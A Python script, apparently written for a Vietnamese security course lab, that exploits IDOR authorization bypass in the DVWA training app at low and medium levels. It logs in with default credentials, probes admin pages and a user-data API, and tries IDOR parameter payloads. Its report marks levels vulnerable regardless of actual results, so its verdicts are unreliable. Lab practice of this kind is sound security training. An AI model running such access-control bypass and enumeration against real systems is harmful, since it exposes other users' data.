#!/usr/bin/env python3
"""
DVWA Authorization Bypass IDOR Exploiter
Cấp độ: Low và Medium
Dựa trên tài liệu Lab5.14
Author: Security Researcher
"""

import requests
import re
import sys
import json
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import argparse
import colorama
from colorama import Fore, Style

# Initialize colorama
colorama.init(autoreset=True)

class DVVAAuthBypassExploiter:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.csrf_tokens = {}
        self.security_level = "low"
        
        # Headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        })
        
        # Disable warnings
        requests.packages.urllib3.disable_warnings()
    
    def print_banner(self):
        """Print banner"""
        print(f"{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}DVWA AUTHORIZATION BYPASS IDOR EXPLOITER")
        print(f"{Fore.CYAN}Cấp độ Low và Medium")
        print(f"{Fore.CYAN}{'='*80}")
    
    def login(self, username, password):
        """Login to DVWA"""
        print(f"\n{Fore.CYAN}[*] Đang đăng nhập: {username}/{password}")
        
        login_url = f"{self.base_url}/login.php"
        
        try:
            # Get login page
            response = self.session.get(login_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Get CSRF token
            token_input = soup.find('input', {'name': 'user_token'})
            csrf_token = token_input.get('value', '') if token_input else ''
            
            # Prepare login data
            login_data = {
                'username': username,
                'password': password,
                'Login': 'Login',
                'user_token': csrf_token
            }
            
            # Perform login
            response = self.session.post(login_url, data=login_data, timeout=10)
            
            if 'index.php' in response.url:
                print(f"{Fore.GREEN}[+] Đăng nhập thành công: {username}")
                
                # Set security level
                self.set_security_level("low")
                return True
            else:
                print(f"{Fore.RED}[-] Đăng nhập thất bại")
                return False
                
        except Exception as e:
            print(f"{Fore.RED}[-] Lỗi đăng nhập: {e}")
            return False
    
    def set_security_level(self, level):
        """Set DVWA security level"""
        self.security_level = level
        
        try:
            security_url = f"{self.base_url}/security.php"
            response = self.session.get(security_url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Get CSRF token
            token_input = soup.find('input', {'name': 'user_token'})
            csrf_token = token_input.get('value', '') if token_input else ''
            
            # Submit security level change
            security_data = {
                'security': level,
                'seclev_submit': 'Submit',
                'user_token': csrf_token
            }
            
            response = self.session.post(security_url, data=security_data, timeout=5)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Security level: {level}")
                return True
                
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Không thể set security level: {e}")
        
        return False
    
    def test_low_security(self, username):
        """Test cấp độ LOW - Theo tài liệu PDF"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}KIỂM TRA CẤP ĐỘ LOW - User: {username}")
        print(f"{Fore.CYAN}{'='*80}")
        
        print(f"\n{Fore.WHITE}[Bước 1] Kiểm tra menu 'Authorization Bypass'")
        
        # Kiểm tra xem có menu Authorization Bypass không
        index_url = f"{self.base_url}/index.php"
        response = self.session.get(index_url, timeout=5)
        
        if 'Authorization Bypass' in response.text:
            print(f"{Fore.GREEN}[+] Có menu 'Authorization Bypass'")
        else:
            print(f"{Fore.YELLOW}[-] Không có menu 'Authorization Bypass' (đúng với user không phải admin)")
        
        print(f"\n{Fore.WHITE}[Bước 2] Truy cập trực tiếp /vulnerabilities/authbypass/")
        
        # Theo PDF: "Một cách để truy cập vào thư mục này là thông qua lỗ hồng IDOR"
        authbypass_url = f"{self.base_url}/vulnerabilities/authbypass/"
        response = self.session.get(authbypass_url, timeout=5)
        
        print(f"URL: {authbypass_url}")
        print(f"Status: HTTP {response.status_code}")
        
        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] CÓ THỂ TRUY CẬP!")
            print(f"{Fore.YELLOW}[!] Lỗ hổng IDOR phát hiện: User {username} có thể truy cập trang admin")
            
            # Parse và hiển thị dữ liệu
            self.parse_authbypass_page(response.text)
            return True
        else:
            print(f"{Fore.RED}[-] Không thể truy cập trực tiếp")
            return False
    
    def parse_authbypass_page(self, html_content):
        """Parse trang authbypass để lấy thông tin user"""
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Tìm bảng user
        table = soup.find('table')
        if table:
            print(f"\n{Fore.WHITE}[*] Dữ liệu user tìm thấy:")
            rows = table.find_all('tr')
            
            for row in rows:
                cells = row.find_all(['td', 'th'])
                row_data = [cell.get_text(strip=True) for cell in cells]
                
                if len(row_data) >= 4:  # Có đủ cột
                    user_id, first_name, surname, action = row_data[:4]
                    if user_id.isdigit():
                        print(f"{Fore.CYAN}  ID: {user_id} | Tên: {first_name} {surname}")
        
        # Tìm forms
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action', '')
            method = form.get('method', 'get').upper()
            print(f"\n{Fore.WHITE}[*] Form tìm thấy: {method} {action}")
            
            # Tìm input fields
            inputs = form.find_all('input')
            for inp in inputs:
                name = inp.get('name', '')
                value = inp.get('value', '')
                if name:
                    print(f"  Input: {name} = {value}")
    
    def test_medium_security(self, username):
        """Test cấp độ MEDIUM - Theo tài liệu PDF"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}KIỂM TRA CẤP ĐỘ MEDIUM - User: {username}")
        print(f"{Fore.CYAN}{'='*80}")
        
        print(f"\n{Fore.WHITE}[Bước 1] Đặt security level = medium")
        self.set_security_level("medium")
        
        print(f"\n{Fore.WHITE}[Bước 2] Kiểm tra truy cập trực tiếp (sẽ bị chặn)")
        
        authbypass_url = f"{self.base_url}/vulnerabilities/authbypass/"
        response = self.session.get(authbypass_url, timeout=5)
        
        print(f"URL: {authbypass_url}")
        print(f"Status: HTTP {response.status_code}")
        
        if response.status_code != 200:
            print(f"{Fore.YELLOW}[-] Truy cập trực tiếp bị chặn (đúng như PDF)")
        
        print(f"\n{Fore.WHITE}[Bước 3] Kiểm tra file get_user_data.php (IDOR khác)")
        
        # Theo PDF: "Hãy kiểm tra xem gordonb có thể truy cập vào tệp dữ liệu thay vì thư mục hay không"
        user_data_url = f"{self.base_url}/vulnerabilities/authbypass/get_user_data.php"
        response = self.session.get(user_data_url, timeout=5)
        
        print(f"URL: {user_data_url}")
        print(f"Status: HTTP {response.status_code}")
        
        if response.status_code == 200:
            print(f"{Fore.GREEN}[+] CÓ THỂ TRUY CẬP FILE DATA!")
            
            try:
                # Parse JSON response
                user_data = json.loads(response.text)
                print(f"{Fore.WHITE}[*] Dữ liệu JSON nhận được:")
                
                for user in user_data:
                    user_id = user.get('user_id', '')
                    first_name = user.get('first_name', '')
                    surname = user.get('surname', '')
                    print(f"{Fore.CYAN}  ID: {user_id} | Tên: {first_name} {surname}")
                
                return True
                
            except json.JSONDecodeError:
                print(f"{Fore.WHITE}Nội dung: {response.text[:200]}...")
                return True
        else:
            print(f"{Fore.RED}[-] Không thể truy cập file data")
            return False
    
    def exploit_low_level(self):
        """Khai thác hoàn chỉnh cấp độ LOW"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}KHAI THÁC CẤP ĐỘ LOW - Hoàn chỉnh")
        print(f"{Fore.CYAN}{'='*80}")
        
        # Bước 1: Login với admin để xem trang authbypass
        print(f"\n{Fore.WHITE}[Bước 1] Login admin để xem cấu trúc trang")
        
        admin_session = requests.Session()
        admin_session.verify = False
        
        # Get login page
        login_url = f"{self.base_url}/login.php"
        response = admin_session.get(login_url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        token_input = soup.find('input', {'name': 'user_token'})
        csrf_token = token_input.get('value', '') if token_input else ''
        
        # Login admin
        login_data = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login',
            'user_token': csrf_token
        }
        
        response = admin_session.post(login_url, data=login_data, timeout=5)
        
        if 'index.php' in response.url:
            print(f"{Fore.GREEN}[+] Đăng nhập admin thành công")
            
            # Set security low
            security_url = f"{self.base_url}/security.php"
            response = admin_session.get(security_url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            token_input = soup.find('input', {'name': 'user_token'})
            csrf_token = token_input.get('value', '') if token_input else ''
            
            security_data = {
                'security': 'low',
                'seclev_submit': 'Submit',
                'user_token': csrf_token
            }
            
            admin_session.post(security_url, data=security_data, timeout=5)
            
            # Truy cập trang authbypass
            authbypass_url = f"{self.base_url}/vulnerabilities/authbypass/"
            response = admin_session.get(authbypass_url, timeout=5)
            
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Admin có thể truy cập trang authbypass")
                
                # Tìm form update
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    if 'update' in form.get('action', '').lower():
                        print(f"{Fore.WHITE}[*] Tìm thấy form update")
                        break
            else:
                print(f"{Fore.RED}[-] Admin không thể truy cập")
        
        # Bước 2: Login với gordonb và thử IDOR
        print(f"\n{Fore.WHITE}[Bước 2] Login gordonb và thử IDOR")
        
        if self.login('gordonb', 'abc123'):
            print(f"\n{Fore.WHITE}[Bước 3] Kiểm tra IDOR cấp độ LOW")
            
            # Test direct access
            success = self.test_low_security('gordonb')
            
            if success:
                print(f"\n{Fore.GREEN}{'='*80}")
                print(f"{Fore.YELLOW}KHAI THÁC THÀNH CÔNG CẤP ĐỘ LOW!")
                print(f"{Fore.GREEN}User gordonb có thể truy cập trang admin bằng IDOR")
                print(f"{Fore.GREEN}{'='*80}")
                
                # Thử thêm các payload khác
                self.test_additional_payloads()
            else:
                print(f"\n{Fore.RED}{'='*80}")
                print(f"{Fore.YELLOW}Không thể khai thác cấp độ LOW")
                print(f"{Fore.RED}{'='*80}")
    
    def exploit_medium_level(self):
        """Khai thác hoàn chỉnh cấp độ MEDIUM"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}KHAI THÁC CẤP ĐỘ MEDIUM - Hoàn chỉnh")
        print(f"{Fore.CYAN}{'='*80}")
        
        # Bước 1: Login với gordonb
        print(f"\n{Fore.WHITE}[Bước 1] Login gordonb")
        
        if self.login('gordonb', 'abc123'):
            # Bước 2: Set security medium
            print(f"\n{Fore.WHITE}[Bước 2] Set security = medium")
            self.set_security_level("medium")
            
            # Bước 3: Test theo PDF
            print(f"\n{Fore.WHITE}[Bước 3] Kiểm tra theo tài liệu PDF")
            
            success = self.test_medium_security('gordonb')
            
            if success:
                print(f"\n{Fore.GREEN}{'='*80}")
                print(f"{Fore.YELLOW}KHAI THÁC THÀNH CÔNG CẤP ĐỘ MEDIUM!")
                print(f"{Fore.GREEN}User gordonb có thể truy cập API get_user_data.php")
                print(f"{Fore.GREEN}{'='*80}")
                
                # Test các endpoint khác
                self.test_api_endpoints()
            else:
                print(f"\n{Fore.RED}{'='*80}")
                print(f"{Fore.YELLOW}Không thể khai thác cấp độ MEDIUM")
                print(f"{Fore.RED}{'='*80}")
    
    def test_additional_payloads(self):
        """Test thêm các payload IDOR khác"""
        print(f"\n{Fore.WHITE}[*] Testing additional IDOR payloads...")
        
        payloads = [
            "?id=1",
            "?id=2",
            "?id=3",
            "?id=4",
            "?id=5",
            "?user=1",
            "?user_id=1",
            "?admin=1",
            "?action=view",
            "?action=edit",
            "?mode=admin"
        ]
        
        base_url = f"{self.base_url}/vulnerabilities/authbypass/"
        
        for payload in payloads:
            url = f"{base_url}{payload}"
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+] {payload}: Accessible")
                    
                    # Check for interesting content
                    if 'admin' in response.text.lower():
                        print(f"   Contains 'admin'")
                    if 'user' in response.text.lower():
                        print(f"   Contains 'user'")
                else:
                    print(f"{Fore.RED}[-] {payload}: HTTP {response.status_code}")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] {payload}: Error - {e}")
    
    def test_api_endpoints(self):
        """Test các API endpoints khác"""
        print(f"\n{Fore.WHITE}[*] Testing other API endpoints...")
        
        endpoints = [
            "/vulnerabilities/authbypass/get_user_data.php?id=1",
            "/vulnerabilities/authbypass/get_user_data.php?id=2",
            "/vulnerabilities/authbypass/get_user_data.php?id=admin",
            "/vulnerabilities/authbypass/change_user_details.php",
            "/vulnerabilities/authbypass/update_user.php",
            "/vulnerabilities/authbypass/save_user.php",
            "/vulnerabilities/authbypass/admin_api.php"
        ]
        
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}"
            try:
                response = self.session.get(url, timeout=5)
                print(f"\n{Fore.CYAN}Endpoint: {endpoint}")
                print(f"Status: HTTP {response.status_code}")
                
                if response.status_code == 200:
                    print(f"{Fore.GREEN}Accessible!")
                    
                    # Try to parse as JSON
                    if response.headers.get('Content-Type', '').startswith('application/json'):
                        try:
                            data = json.loads(response.text)
                            print(f"JSON data: {json.dumps(data, indent=2)[:200]}...")
                        except:
                            print(f"Content: {response.text[:200]}...")
                    else:
                        print(f"Content type: {response.headers.get('Content-Type')}")
                        print(f"Content preview: {response.text[:200]}...")
                elif response.status_code == 403:
                    print(f"{Fore.RED}Forbidden")
                elif response.status_code == 404:
                    print(f"{Fore.YELLOW}Not Found")
                    
            except Exception as e:
                print(f"{Fore.YELLOW}Error: {e}")
    
    def automated_full_test(self):
        """Chạy test tự động hoàn chỉnh"""
        self.print_banner()
        
        print(f"\n{Fore.WHITE}Target URL: {self.base_url}")
        print(f"{Fore.WHITE}Testing based on Lab5.14 PDF")
        
        results = {
            'low_level': False,
            'medium_level': False
        }
        
        try:
            # Test LOW level
            print(f"\n{Fore.CYAN}{'='*80}")
            print(f"{Fore.YELLOW}PHASE 1: TESTING LOW SECURITY LEVEL")
            print(f"{Fore.CYAN}{'='*80}")
            
            self.exploit_low_level()
            results['low_level'] = True
            
            # Create new session for medium level
            self.session = requests.Session()
            self.session.verify = False
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
            })
            
            # Test MEDIUM level
            print(f"\n{Fore.CYAN}{'='*80}")
            print(f"{Fore.YELLOW}PHASE 2: TESTING MEDIUM SECURITY LEVEL")
            print(f"{Fore.CYAN}{'='*80}")
            
            self.exploit_medium_level()
            results['medium_level'] = True
            
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Test bị gián đoạn")
        except Exception as e:
            print(f"\n{Fore.RED}[!] Error: {e}")
        
        # Generate report
        self.generate_report(results)
    
    def generate_report(self, results):
        """Generate final report"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}FINAL REPORT - DVWA Authorization Bypass IDOR")
        print(f"{Fore.CYAN}{'='*80}")
        
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        
        print(f"\n{Fore.WHITE}Scan Time: {timestamp}")
        print(f"Target: {self.base_url}")
        print(f"\n{Fore.WHITE}Results:")
        print(f"  LOW Level IDOR: {'VULNERABLE' if results.get('low_level') else 'SECURE'}")
        print(f"  MEDIUM Level IDOR: {'VULNERABLE' if results.get('medium_level') else 'SECURE'}")
        
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{Fore.YELLOW}RECOMMENDATIONS")
        print(f"{Fore.CYAN}{'='*80}")
        
        print(f"\n{Fore.WHITE}1. LOW Level Fix:")
        print(f"   - Implement server-side authorization checks")
        print(f"   - Don't rely on client-side menu visibility")
        print(f"   - Check user role before accessing admin pages")
        
        print(f"\n{Fore.WHITE}2. MEDIUM Level Fix:")
        print(f"   - Secure all API endpoints, not just HTML pages")
        print(f"   - Implement proper access control on data APIs")
        print(f"   - Use authentication tokens for API calls")
        
        print(f"\n{Fore.WHITE}3. General IDOR Prevention:")
        print(f"   - Use indirect object references (UUIDs instead of sequential IDs)")
        print(f"   - Implement proper session management")
        print(f"   - Log all access attempts to sensitive endpoints")
        
        # Save report to file
        report_file = f"dvwa_authbypass_report_{int(time.time())}.txt"
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write("="*80 + "\n")
            f.write("DVWA AUTHORIZATION BYPASS IDOR TEST REPORT\n")
            f.write("="*80 + "\n\n")
            
            f.write(f"Scan Time: {timestamp}\n")
            f.write(f"Target URL: {self.base_url}\n\n")
            
            f.write("RESULTS:\n")
            f.write("-"*40 + "\n")
            f.write(f"LOW Level: {'VULNERABLE' if results.get('low_level') else 'SECURE'}\n")
            f.write(f"MEDIUM Level: {'VULNERABLE' if results.get('medium_level') else 'SECURE'}\n\n")
            
            f.write("VULNERABILITIES FOUND:\n")
            f.write("-"*40 + "\n")
            
            if results.get('low_level'):
                f.write("1. LOW Level: Direct access to /vulnerabilities/authbypass/\n")
                f.write("   Impact: Non-admin users can access admin-only pages\n")
                f.write("   Fix: Implement server-side authorization checks\n\n")
            
            if results.get('medium_level'):
                f.write("2. MEDIUM Level: Access to get_user_data.php API\n")
                f.write("   Impact: Non-admin users can retrieve sensitive user data\n")
                f.write("   Fix: Secure API endpoints with proper authentication\n\n")
            
            f.write("TEST METHODOLOGY:\n")
            f.write("-"*40 + "\n")
            f.write("1. Login as non-admin user (gordonb/abc123)\n")
            f.write("2. Attempt direct access to admin pages\n")
            f.write("3. Test API endpoints for IDOR vulnerabilities\n")
            f.write("4. Check for missing authorization checks\n")
        
        print(f"\n{Fore.GREEN}[+] Report saved to: {report_file}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='DVWA Authorization Bypass IDOR Exploiter')
    parser.add_argument('-u', '--url', required=True, help='DVWA base URL (e.g., http://localhost:8000)')
    parser.add_argument('-l', '--level', choices=['low', 'medium', 'all'], default='all', 
                       help='Security level to test (low, medium, all)')
    
    args = parser.parse_args()
    
    # Create exploiter instance
    exploiter = DVVAAuthBypassExploiter(args.url)
    
    # Run tests based on level
    if args.level == 'all':
        exploiter.automated_full_test()
    elif args.level == 'low':
        exploiter.print_banner()
        if exploiter.login('gordonb', 'abc123'):
            exploiter.exploit_low_level()
    elif args.level == 'medium':
        exploiter.print_banner()
        if exploiter.login('gordonb', 'abc123'):
            exploiter.exploit_medium_level()

if __name__ == "__main__":
    main()